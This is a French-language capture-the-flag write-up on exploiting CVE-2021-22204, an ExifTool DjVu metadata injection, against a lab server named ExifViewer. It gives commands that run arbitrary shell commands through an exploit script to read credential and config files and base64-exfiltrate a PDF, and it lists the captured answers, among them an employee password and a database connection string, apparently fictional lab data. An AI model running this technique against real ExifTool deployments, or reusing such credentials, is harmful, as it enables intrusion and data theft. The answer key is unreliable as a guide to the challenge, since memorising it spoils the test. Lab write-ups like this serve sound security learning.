# 🕵️‍♂️ GUIDE D'EXPLOITATION - CHALLENGE DATA HEIST

Ce guide documente l'exploitation complète de la vulnérabilité CVE-2021-22204 sur le serveur ExifViewer.

## 🎯 Objectifs Validés

1. ✅ **Identifier le chemin d'upload**
2. ✅ **Trouver les identifiants employés**
3. ✅ **Récupérer la facture interne**
4. ✅ **Obtenir l'accès à la base de données**

---

## 🛠️ Outils & Scripts

Tous les scripts sont situés dans `/home/aurel/CTF/`.

### 1. `exploit_smart.py` (Script Principal)

Le couteau suisse de l'exploitation. Crée un payload DjVu malveillant, l'injecte dans une image, l'uploade et extrait le résultat.
**Usage :**

```bash
python3 exploit_smart.py 'votre commande ici'
```

### 2. `auto_pwn.py` (Automatisation)

Lance une séquence d'attaques prédéfinies pour tout récupérer d'un coup.
**Usage :**

```bash
python3 auto_pwn.py
```

### 3. Scripts d'Analyse

- `extract_invoice.py` : Extrait et analyse le PDF de facture.
- `database.go` : Fichier récupéré contenant les credentials DB.

---

## 📍 Résultats & Réponses (SPOILERS)

### 1. Chemin de Stockage des Fichiers

- **Chemin :** `/var/www/93c0550a5543b366_uploads/`
- **Découverte :** Via lecture du code source `index.php`.

### 2. Employé Compromis (Walters Ltd)

- **Fichier :** `users.csv`
- **Nom :** Lori Burton
- **Email :** `salvarado@waltersltd.hv`
- **Mot de passe :** `hGCQjxZs5chK`
- **Commande :** `python3 exploit_smart.py 'grep -i waltersltd /var/www/93c0550a5543b366_uploads/users.csv'`

### 3. Numéro de Facture

- **Numéro :** `Ja23s6` (ou ID interne `INV-20240228-1234`)
- **Fichier :** `Ja23s6_techinnovations_invoice.pdf`
- **Commande :** `python3 exploit_smart.py 'ls -la /var/www/93c0550a5543b366_uploads/'`

### 4. Connexion Base de Données

- **Adresse :** `postgres://postgres:JS3CqjNCcn7Ve@olympusbytes.hv:5432/olympus`
- **Hôte :** `olympusbytes.hv:5432`
- **User/Pass :** `postgres` / `JS3CqjNCcn7Ve`
- **Source :** Fichier `database.go` trouvé dans les uploads.

---

## 🚀 Reproduction de l'Exploit (Pas à Pas)

1. **Vérifier la connexion VPN**

   ```bash
   ping -c 1 172.20.31.23
   ```

2. **Lister le contenu du dossier d'upload**

   ```bash
   python3 exploit_smart.py 'ls -la /var/www/93c0550a5543b366_uploads/'
   ```

3. **Lire les fichiers sensibles**

   ```bash
   # Identifiants
   python3 exploit_smart.py 'cat /var/www/93c0550a5543b366_uploads/users.csv'
   
   # Config Database
   python3 exploit_smart.py 'cat /var/www/93c0550a5543b366_uploads/database.go'
   ```

4. **Exfiltrer des fichiers binaires (PDF)**

   ```bash
   python3 exploit_smart.py 'base64 /var/www/93c0550a5543b366_uploads/Ja23s6_techinnovations_invoice.pdf'
   ```

---

## ⚠️ Notes Techniques

- **Vulnérabilité :** CVE-2021-22204 (ExifTool < 12.24)
- **Méthode :** Injection de métadonnées DjVu malformées.
- **Contrainte :** Le serveur ne renvoie pas toujours la sortie standard (STDOUT) dans le visualiseur HTML, mais l'exploit capture la sortie via les métadonnées de l'image traitée ou directement dans la réponse PHP si `exec()` est utilisé.
